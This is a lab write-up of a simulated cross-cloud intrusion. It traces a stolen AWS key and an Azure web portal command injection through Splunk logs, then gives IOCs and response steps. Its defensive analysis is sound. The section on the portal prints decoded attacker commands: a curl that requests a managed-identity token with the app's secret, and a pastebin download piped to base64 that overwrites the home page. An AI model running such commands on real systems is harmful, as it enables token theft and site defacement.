# Rotten Cloud: Cross-Cloud Intrusion Investigation with Splunk (Blue Team Labs Online)

**Platform:** Blue Team Labs Online, Incident Response
**Tools:** Splunk (SPL), CyberChef, whatismyipaddress.com (IP2Location data)
**Verdict:** One attacker, working from a rented cloud server, used a stolen AWS access key to map EC2, read a Windows admin password and download five files from S3. The same server then exploited a command-injection flaw in Zeta-9's Azure research portal, requested the portal's own Azure identity token, downloaded six files from Azure Blob Storage and replaced the portal's home page.

> Indicators in the text are defanged (`[.]`, `hxxp`). Splunk queries are shown exactly as I ran them. The lab's original files are not included.

## Summary

On 25 September 2025, between 16:06 and 16:50 UTC, the IP address `172.235.129[.]221`, a rented Linode (Akamai) server in the US, attacked Zeta-9 in both AWS and Azure. Zeta-9's legitimate users work remotely from India.

- **AWS (16:06 to 16:27):** signed in as the IAM user **VictorVenom** with a long-term access key, the attacker listed the EC2 instances, read a secret named `zeta9/windows/admin-password` and downloaded five files from three S3 buckets, including third-party API keys and a database backup.
- **Azure storage (16:38 to 16:41):** listed the storage account `zeta9researchdata` and downloaded six files from its `quantum-research-secrets` container, including files about the secret lab's network and VPN.
- **Azure web portal (16:49 to 16:50):** sent shell commands to a hidden `/uptime` page on `zeta9-research-portal.azurewebsites[.]net`, which ran them on the server. The commands requested the web app's managed-identity token for Azure Resource Manager and overwrote the portal's home page with content downloaded from pastebin.

Every logged request succeeded. Three things limit the picture:

- the logs don't show how the AWS key was stolen;
- the attacker repeatedly used names and a secret they never looked up in these logs, most likely found on a compromised EC2 instance;
- the Azure storage access is timestamped **before** the token theft, so the two Azure logs disagree on the order of events.

## Scenario and evidence

Zeta-9 Corporation runs a hybrid cloud environment for its Quantum Research Division. Staff reach the research data through a web portal. After an earlier breach, which this lab doesn't cover, the task was to find out whether the attacker had moved into the cloud. The lab states that legitimate users were working remotely from India.

The evidence is a Splunk instance holding 4,028 events from three log sources:

```
index=* | stats count by sourcetype
```

| Sourcetype | Events | What it records |
|---|---|---|
| `CloudTrail` | 2,239 | AWS API activity: who called which AWS service, from where |
| `AppServiceHTTPLogs` | 1,578 | Requests to a web application hosted on Azure App Service |
| `StorageBlobLogs` | 211 | Access to files in Azure Blob Storage |

![The three log sources in Splunk](rotten-cloud-sourcetypes.webp)

Splunk displayed times in UTC. For CloudTrail this matched each event's `eventTime`. For the App Service logs it matched the raw `TimeGenerated [UTC]` field. I didn't check the raw time field in the storage logs.

## Timeline (UTC, 25 September 2025)

| Time | Source | Event |
|---|---|---|
| 16:06:00 | AWS EC2 | `DescribeInstances`: list the EC2 instances |
| 16:08:00 | AWS EC2 | `DescribeInstances` again, with the same empty request |
| 16:15:00 | AWS Secrets Manager | `GetSecretValue` on `zeta9/windows/admin-password` |
| 16:27:00 to 16:27:04 | AWS S3 | `GetObject` ×5: five files from three buckets, one per second |
| 16:38:07 | Azure Storage | `ListContainers` on the storage account `zeta9researchdata` |
| 16:38:24 | Azure Storage | `ListBlobs` on the container `quantum-research-secrets` |
| 16:41:12.000 to .750 | Azure Storage | `GetBlob` ×6: six files downloaded in under a second |
| 16:49:00 | Azure web portal | `/uptime` runs `curl` to request a managed-identity token for `management.azure.com` |
| 16:49:20 | Azure web portal | `/uptime` runs `ls -la /home/site/wwwroot/` |
| 16:49:40 | Azure web portal | `/uptime` runs `whoami` |
| 16:50:00 | Azure web portal | `/uptime` downloads a page from pastebin and overwrites `index.html` |
| After 16:50 | Azure web portal | Only automated `/health` requests are logged; nobody loads the home page |

The Azure storage rows come before the token theft. Section 6 explains why that's a problem.

## Analysis

### 1. Finding the attacker

I started by listing every source of CloudTrail activity:

```
index=* sourcetype=CloudTrail
| stats count by sourceIPAddress
```

![CloudTrail events grouped by source](rotten-cloud-source-ips.png)

There were only two values:

- `172.235.129[.]221`, with 8 events.
- `cloudtrail.amazonaws.com`, with the rest. This isn't an IP address. When an AWS service makes a call itself, CloudTrail records the service's name in this field, so these events are AWS's own background activity.

So the only real IP address in the logs was `172.235.129[.]221`, and no Indian IP appeared at all. I looked it up on whatismyipaddress.com:

- **Hostname:** `172-235-129-221.ip.linodeusercontent[.]com`
- **ASN:** 63949, Akamai Technologies (Linode)
- **Type:** Data Center/Transit
- **Location:** Miami, Florida, US

![IP lookup for 172.235.129[.]221](rotten-cloud-ip-lookup.png)

This is a rented cloud server, not an employee's home or office connection. The location shows where the server is, not where the attacker is. I looked it up in October 2026, about a year after the attack, so the address may have changed hands since.

**Which identity was used:** every CloudTrail event records who signed the request in its `userIdentity` fields. All 8 events from this IP were signed by the IAM user **VictorVenom** with the access key `AKIA3EBEV4OQF3XCXJ5S`. The `AKIA` prefix marks a long-term IAM user key, which stays valid until someone disables it.

![All 8 events were signed by VictorVenom](rotten-cloud-username.png)

![All 8 events used the same access key](rotten-cloud-accesskey.png)

**Searching by key instead of IP:** an attacker can switch servers at any time, but every request has to be signed with the stolen key. So I searched for the key and grouped by source IP, to check whether it had been used from anywhere else:

```
index=* sourcetype=CloudTrail userIdentity.accessKeyId="AKIA3EBEV4OQF3XCXJ5S"
| stats count by sourceIPAddress
```

![The key was used from one IP only](rotten-cloud-key-source-ips.webp)

It hadn't. All 8 uses came from `172.235.129[.]221`. I then listed everything the key did, in order:

```
index=* sourcetype=CloudTrail userIdentity.accessKeyId="AKIA3EBEV4OQF3XCXJ5S"
| sort _time
| table _time eventSource eventName awsRegion errorCode
```

![Everything the attacker did in AWS](rotten-cloud-aws-timeline.webp)

`errorCode` is empty on all 8 events. CloudTrail adds it only when a request fails, so every request succeeded. The pattern is clear: **reconnaissance, then a stolen secret, then data theft**.

### 2. Reconnaissance: listing the EC2 instances

```
index=* sourcetype=CloudTrail sourceIPAddress="172.235.129.221" eventSource="ec2.amazonaws.com"
| table _time eventName awsRegion readOnly errorCode userAgent
```

![The two DescribeInstances calls](rotten-cloud-ec2-recon.webp)

- The attacker called `DescribeInstances` at 16:06 and again at 16:08. This call lists the EC2 instances (virtual servers) with their details, such as IDs, IP addresses, state and operating system.
- `readOnly: true`: it changes nothing. It's for looking around.
- `requestParameters` was empty on both calls, with no filter or instance ID, so each call returned every instance in `us-east-1`.
- `userAgent: aws-cli/2.30.6`: the attacker used the AWS command-line tool, not the web console.
- CloudTrail doesn't record the response to this call, so the logs don't show which instances the attacker saw. Most likely the list showed a Windows instance, which would explain why the next step went after a Windows password.

### 3. Stealing the Windows admin password

```
index=* sourcetype=CloudTrail userIdentity.accessKeyId="AKIA3EBEV4OQF3XCXJ5S" eventSource="secretsmanager.amazonaws.com" eventName=GetSecretValue awsRegion="us-east-1" | sort _time
```

![GetSecretValue on the Windows admin password](rotten-cloud-secret.webp)

- At 16:15, seven minutes after the second instance listing, the attacker called `GetSecretValue` on the secret **`zeta9/windows/admin-password`** in AWS Secrets Manager.
- `responseElements: null`: CloudTrail records that a secret was read, never its value. The name says it holds a Windows admin password, but the log can't show the password itself.
- With the list of instances and an admin password, the attacker had what they needed to log into a Windows server. The lab says they did, and went through the instance's browsing history. The logs can't confirm this: CloudTrail records AWS API calls, not Windows logons, and the instance's Windows Security log isn't part of this evidence.

### 4. Data theft from S3

```
index=* sourcetype=CloudTrail userIdentity.accessKeyId="AKIA3EBEV4OQF3XCXJ5S" eventName=GetObject
| sort _time
| table _time requestParameters.bucketName requestParameters.key additionalEventData.bytesTransferredOut errorCode
```

![The five files downloaded from S3](rotten-cloud-s3-downloads.png)

At 16:27 the attacker downloaded **five files from three S3 buckets**, one per second:

| Time | Bucket | File | Why it matters |
|---|---|---|---|
| 16:27:00 | `zombie-killer-antivirus` | `reports/threat-analysis-September-2025.json` | Zeta-9's own threat analysis tells the attacker what the defenders know |
| 16:27:01 | `zeta9-cloudaws-ops` | `infrastructure/cloudformation/database-stack.txt` | A blueprint of the database setup. Templates like this often contain endpoints or passwords |
| 16:27:02 | `zeta9-cloudaws-ops` | `secrets/api-keys/third-party-integrations.dat` | API keys for other services, which let the attacker reach systems outside AWS |
| 16:27:03 | `zeta9-cloudaws-ops` | `backups/database-backup-sept-24.tar.gz` | A full database copy, which may contain personal data or more credentials |
| 16:27:04 | `zombietesting` | `Subject-Zombie15-Experiment.pdf` | Research data, the sensitive material the scenario describes |

The `zeta9-cloudaws-ops` bucket held three of the five files, including the most damaging ones. I first counted the buckets and files in Splunk's field sidebar, but it counts each field on its own and can't show which file came from which bucket. The table pairs them. The `bytesTransferredOut` column is empty, so the logs don't record how much data was taken.

**No listing first.** None of the eight AWS requests lists what exists: there's no `ListSecrets`, `ListBuckets` or `ListObjects`. The attacker asked for one secret and five files by exact name. Names like `backups/database-backup-sept-24.tar.gz` can't realistically be guessed, so they must have come from outside AWS. The timeline fits the EC2 instance: the attacker read the Windows password at 16:15, nothing is logged for 12 minutes, and then the exact downloads start at 16:27. This doesn't explain the secret's own name, which they requested before they could log in.

### 5. Moving into Azure: the research portal

The AWS key and VictorVenom mean nothing in Azure, but the attacker's IP can appear in any log. I searched the App Service logs for it, using the client IP field `CIp`:

```
index=* sourcetype=AppServiceHTTPLogs CIp="172.235.129.221"
| stats count by CsHost
```

![The attacker's IP reached one Azure website](rotten-cloud-portal-host.webp)

The same server that attacked AWS made **4 requests to `zeta9-research-portal.azurewebsites[.]net`**. That's the link between the two clouds. All 1,578 App Service events belong to this one site, so the attacker didn't pick it out from a list. They went straight to it. According to the lab, they found it in the EC2 instance's browsing history.

![All App Service events are for the research portal](rotten-cloud-portal-all-hosts.webp)

The four requests:

```
index=* sourcetype=AppServiceHTTPLogs CIp="172.235.129.221"
| sort _time
| table _time CsMethod CsUriStem CsUriQuery ScStatus UserAgent
```

![The attacker's four requests to /uptime](rotten-cloud-portal-requests.webp)

All four are `GET /uptime` from `curl/7.68.0`, and all returned HTTP 200. Each carries a `cmd=` parameter. I URL-decoded them in CyberChef:

| Time | Decoded `cmd=` |
|---|---|
| 16:49:00 | `curl -H secret:4ebc6d54-f421-4321-81c4-fd9e29d28a0f 'hxxp://169.254.130[.]3:8081/msi/token?api-version=2017-09-01&resource=hxxps://management.azure[.]com/'` |
| 16:49:20 | `ls -la /home/site/wwwroot/` |
| 16:49:40 | `whoami` |
| 16:50:00 | `curl -s hxxps://pastebin[.]com/raw/sBEs83q3 \| base64 -d > /home/site/wwwroot/public/index.html` |

![CyberChef: URL-decoding the token request](rotten-cloud-cyberchef-token.webp)

**`/uptime` runs whatever it's given.** The first command calls `169.254.130.3`, a link-local address that can only be reached from inside Azure, never from the internet. The attacker's server couldn't have reached it directly. The `ComputerName` field shows that one Azure server, `lw0sdlwk0006Q2`, handled all four requests. So the portal itself ran the commands: `/uptime` passes its `cmd` parameter to the server's shell. This is **OS command injection**, which gives **remote code execution**. Anyone who can reach the page can run commands on the web server, with no password.

![All four requests were handled by one Azure server](rotten-cloud-portal-computername.png)

No one else ever used this page. In 1,578 requests to the portal, `/uptime` was called only by the attacker:

```
index=* sourcetype=AppServiceHTTPLogs CsUriStem="/uptime"
| stats count by CIp
```

![Only the attacker called /uptime](rotten-cloud-uptime-callers.webp)

It looks like a hidden or forgotten diagnostic page rather than something staff use.

**The token theft (16:49:00).** Azure can give a web app its own identity, a *managed identity*, so the app can use other Azure services without a password in its code. When the app needs access, it asks a local endpoint for a **token**, presenting a `secret` header that only the app should know. The attacker made the server send exactly that request:

- **`169.254.130.3:8081/msi/token`:** the web app's local managed-identity endpoint.
- **`-H secret:…`:** the app's secret, proving the request comes from the app.
- **`resource=hxxps://management.azure[.]com/`:** asks for a token for **Azure Resource Manager**, the API that manages Azure resources.

The token lets its holder act **as the web app's identity, with that identity's permissions**, from any machine, until it expires. It isn't "root" over Azure. Its power depends on the roles the app was given. If `/uptime` returns the command's output, as such pages usually do, the token came straight back to the attacker. The log records that the request succeeded (HTTP 200) but not the response, so it doesn't show the token itself. The output of `whoami` isn't logged either, so I can't say which user the commands ran as.

**Another secret the attacker already knew.** The very first request already contains the `secret` value. On an App Service server that value is an environment variable, and printing it would need a command such as `env`. No such command was logged, and nobody else ever called `/uptime`. Like the S3 file names, the attacker brought this knowledge with them, most likely from the EC2 instance.

### 6. Data theft from Azure Blob Storage

I filtered the storage logs on the attacker's IP. In these logs the `CallerIpAddress` field includes a port number:

```
index=* sourcetype=StorageBlobLogs
| stats count by CallerIpAddress
```

![Callers in the storage logs](rotten-cloud-blob-callers.webp)

There were only two callers:

- **`172.235.129[.]221` on eight different ports.** That's the same attacker machine opening several connections.
- **`103.53.72[.]87`.** A lookup shows an Indian ISP (ISHAN Netsol, AS45117, Vadodara) with no data-centre flag. That fits the legitimate users working from India, and it's a useful contrast with the attacker's data-centre server.

![IP lookup for 103.53.72[.]87](rotten-cloud-legit-ip-lookup.png)

```
index=* sourcetype=StorageBlobLogs CallerIpAddress="172.235.129.221:*"
| sort _time
| table _time OperationName ObjectKey StatusText AuthenticationType
```

![The attacker's eight storage operations](rotten-cloud-blob-operations.webp)

`ObjectKey` has the form `/storage account/container/file`. All 8 operations succeeded, and all used `OAuth` (token-based) authentication:

| Time | Operation | Target |
|---|---|---|
| 16:38:07 | `ListContainers` | storage account `zeta9researchdata` |
| 16:38:24 | `ListBlobs` | container `quantum-research-secrets` |
| 16:41:12.000 | `GetBlob` | `contracts/military-qc-2025.txt` |
| 16:41:12.150 | `GetBlob` | `research/quantum-nexus-status.txt` |
| 16:41:12.300 | `GetBlob` | `secretLAB/SecretLANConnection.txt` |
| 16:41:12.450 | `GetBlob` | `secretLAB/SecretLabInfo.txt` |
| 16:41:12.600 | `GetBlob` | `secretLAB/SecretNetworkVPN.txt` |
| 16:41:12.750 | `GetBlob` | `secretLAB/AntiZombieSolution.txt` |

- **Six files downloaded** (`GetBlob` = download). The other two events are listings, not downloads.
- **What was taken:** a military contract, research status, and four files from `secretLAB`. Judging by their names, two describe the secret lab's LAN connection and network VPN, and a third is general information about the lab. That's exactly what someone would need to reach the "secret division systems" the lab mentions. Only the names are logged, not the contents.
- **Here the attacker listed first.** In AWS they went straight to exact names. In Azure they listed the containers, then the files, then downloaded. Azure storage was new to them, which supports the idea that the AWS names were known in advance.

**The timestamps conflict.** As logged, this storage access (16:38 to 16:41) happened **before** the token request at 16:49. A token can't be used before it's stolen. I confirmed that the App Service times match the raw log. I didn't check the storage log's raw times. There's a second problem too: reading blob contents with OAuth needs a token for **Azure Storage**, but the logged request asked for one for `management.azure.com`. So either one source's timestamps are wrong and the attacker made a second token request that isn't logged, or the attacker reached storage some other way that these logs don't show. The evidence can't settle which.

### 7. Defacing the portal

The last command, at 16:50:00:

```
curl -s hxxps://pastebin[.]com/raw/sBEs83q3 | base64 -d > /home/site/wwwroot/public/index.html
```

![CyberChef: URL-decoding the defacement command](rotten-cloud-cyberchef-pastebin.webp)

| Part | What it does |
|---|---|
| `curl -s hxxps://pastebin[.]com/raw/sBEs83q3` | Downloads the attacker's content from pastebin |
| `\| base64 -d` | Decodes it. The paste was stored base64-encoded, so anyone glancing at it saw gibberish rather than obvious HTML |
| `> /home/site/wwwroot/public/index.html` | Writes the result over `index.html`, the portal's home page |

The attacker had listed the web root (`ls -la /home/site/wwwroot/`) 40 seconds earlier.

**Why deface it?** The lab says the goal was access to the secret division's systems. The portal's users are restricted staff with that access. If the attacker controls the page they open every day, the page can try to make them hand over access: a fake login form, a malicious download, or instructions to run a command. This is a **watering hole attack**. Anyone who fell for it would give the attacker their own access, with their permissions.

What the logs show and don't show:

- **Shown:** the request returned HTTP 200.
- **Not shown:** whether the file was actually replaced, or what the new page contained. The paste is no longer available, and the logs only record the command that fetched it.

**Did anyone see it?**

```
index=* sourcetype=AppServiceHTTPLogs earliest="09/25/2025:16:50:00"
| stats count by CIp CsUriStem
```

![Requests to the portal from 16:50 onwards](rotten-cloud-after-defacement.webp)

From 16:50 onwards, the only requests are the attacker's own `/uptime` call and 925 requests to `/health` from four IPs, about 230 each. That pattern fits automated monitoring checking the site is up. Nobody requested the home page, so **these logs show no visits to the defaced page**. That only covers the period these logs include.

## What the logs don't show

- **How the AWS key was stolen.** The logs show the key being used, not where it leaked from.
- **Whether the attacker logged into the EC2 instance.** The lab says they did. A logon would appear in the instance's Windows logs, which aren't part of this evidence.
- **How the attacker knew** the exact S3 file names, the `/uptime` page and the managed-identity secret. The timeline points to the EC2 instance. The secret name `zeta9/windows/admin-password` was requested before any logon was possible, so it stays unexplained.
- **The true order of the Azure events,** and which token unlocked the storage (section 6).
- **What the attacker got back:** the token, the `whoami` output, the stolen files' contents and sizes.
- **The defaced page's content,** and whether the overwrite took effect.

## Indicators of compromise

| Type | Indicator | Context |
|---|---|---|
| IP | `172.235.129[.]221` | The attacker's server (Linode/Akamai, AS63949). Source of all activity in AWS and Azure |
| Hostname | `172-235-129-221.ip.linodeusercontent[.]com` | Hostname of that IP |
| IAM user | `VictorVenom` | Compromised AWS identity |
| Access key ID | `AKIA3EBEV4OQF3XCXJ5S` | Long-term key used for every AWS request |
| URL | `hxxps://pastebin[.]com/raw/sBEs83q3` | Hosted the base64-encoded defacement page |
| URL pattern | `/uptime?cmd=` on the research portal | Command injection. Any request with `cmd=` is malicious |
| URL pattern | `169.254.130[.]3:8081/msi/token` inside a request | Attempt to steal the web app's managed-identity token |
| User agents | `aws-cli/2.30.6`, `curl/7.68.0` | The attacker's tools. Common, so not useful on their own |

## Affected resources

| Resource | What happened |
|---|---|
| AWS account `764581110688`, region `us-east-1` | EC2 instances listed |
| Secrets Manager secret `zeta9/windows/admin-password` | Read at 16:15 |
| S3 buckets `zeta9-cloudaws-ops`, `zombie-killer-antivirus`, `zombietesting` | Five files downloaded (section 4) |
| Azure App Service `zeta9-research-portal.azurewebsites[.]net`, server `lw0sdlwk0006Q2` | Commands run through `/uptime`, managed-identity token requested, home page overwritten |
| Azure storage account `zeta9researchdata`, container `quantum-research-secrets` | Listed, and six files downloaded (section 6) |

## MITRE ATT&CK mapping

| Technique | ID | Evidence |
|---|---|---|
| Valid Accounts: Cloud Accounts | T1078.004 | VictorVenom's access key used from the attacker's server |
| Cloud Infrastructure Discovery | T1580 | `DescribeInstances` twice |
| Credentials from Password Stores: Cloud Secrets Management Stores | T1555.006 | `GetSecretValue` on the Windows admin password |
| Data from Cloud Storage | T1530 | Five S3 `GetObject` and six Azure `GetBlob` downloads |
| Exploit Public-Facing Application | T1190 | Command injection through `/uptime` |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | `curl`, `ls`, `whoami` run on the portal's server |
| Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | Token requested from the local managed-identity endpoint |
| Cloud Storage Object Discovery | T1619 | `ListContainers` and `ListBlobs` |
| Defacement: External Defacement | T1491.002 | `index.html` overwritten |
| Drive-by Compromise | T1189 | The stated aim of the defacement: attacking the portal's users. Not observed in the logs |

## Recommended response

Following the NIST incident-response lifecycle:

1. **Contain.**
   - Deactivate the access key `AKIA3EBEV4OQF3XCXJ5S`. Check VictorVenom for other keys or a console password and disable them.
   - Take `/uptime` offline straight away, or the whole portal if that can't be done quickly.
   - Remove the web app's managed-identity role assignments until the app is fixed. A token that's already been issued stays valid until it expires, so removing the permissions is what cuts it off.
   - Block `172.235.129[.]221`, but don't rely on it, because the attacker can switch servers.
2. **Preserve, then restore.** Copy the current `index.html` as evidence before restoring the real page. It's the only way to learn what visitors would have seen, now that the paste is gone.
3. **Rotate everything that was exposed.**
   - The Windows admin password (on the instances and in the secret).
   - Every API key in `third-party-integrations.dat`.
   - Any credentials in the database backup or the CloudFormation template.
   - Anything described in `SecretNetworkVPN.txt`, `SecretLANConnection.txt` and `SecretLabInfo.txt`: treat the secret lab's network and VPN access as compromised.
4. **Scope.**
   - Check the Windows instances' Security logs for logons after 16:15 UTC on 25 September 2025, especially remote desktop (event ID 4624, logon type 10). Find what on the instance revealed the portal, the S3 names and the secret.
   - Review the Azure Activity Log for anything done with the management token. That log isn't in this evidence.
   - Check the storage log's raw timestamps to settle the order of the Azure events.
   - Extend the portal logs past this window to confirm whether any staff loaded the defaced page.
   - Search CloudTrail in every region for other VictorVenom activity, and ask the third-party services whether the stolen API keys have been used.
5. **Assess the data exposure.** Involve the data-protection team and the owners of the stolen research and contract data. If the database backup holds personal data, the breach may have to be reported to the regulator (the ICO in the UK) within 72 hours of discovery.
6. **Fix the causes.**
   - Remove `/uptime`. A web page should never pass user input to a shell.
   - Apply least privilege to VictorVenom and to the web app's identity.
   - Replace long-term access keys with short-lived credentials (IAM roles or IAM Identity Center).
   - Store API keys in a secrets manager, not in files.
   - Alert on `GetSecretValue` calls, on bursts of downloads, on API calls from unfamiliar IPs, and on `cmd=` in web requests.
   - Send Windows host logs and the Azure Activity Log to Splunk. Their absence left the biggest gaps in this investigation.

## Lessons learned

- **Not every value in `sourceIPAddress` is an IP.** At first I took `cloudtrail.amazonaws.com` for the employees' VPN. It's AWS calling itself.
- **Pivot on the identity within a cloud, and on the IP across clouds.** The access key confirmed the AWS activity came from one place. The IP was the only indicator that carried over into Azure.
- **Filter on fields, and match what you're looking for.** My first EC2 search used the word `EC2`, and my first storage search excluded the other IP with `!=`. Both worked here, but `eventSource="ec2.amazonaws.com"` and `CallerIpAddress="172.235.129.221:*"` match only what I meant to find.
- **"Root" is the wrong word for stolen cloud credentials.** I first described the managed-identity token as root access. It carries only the web app identity's permissions, and stating it accurately matters for scoping the response.
- **Check timestamps across sources before building one timeline.** The two Azure logs put the storage access before the token theft. Merging them without noticing would have produced a timeline that runs backwards.
- **Know what each source can't show.** CloudTrail recorded that a secret was read but not its value, and it never sees Windows logons. The web logs recorded commands but not their output. The field sidebar counts fields separately, so pairing values needs a table.
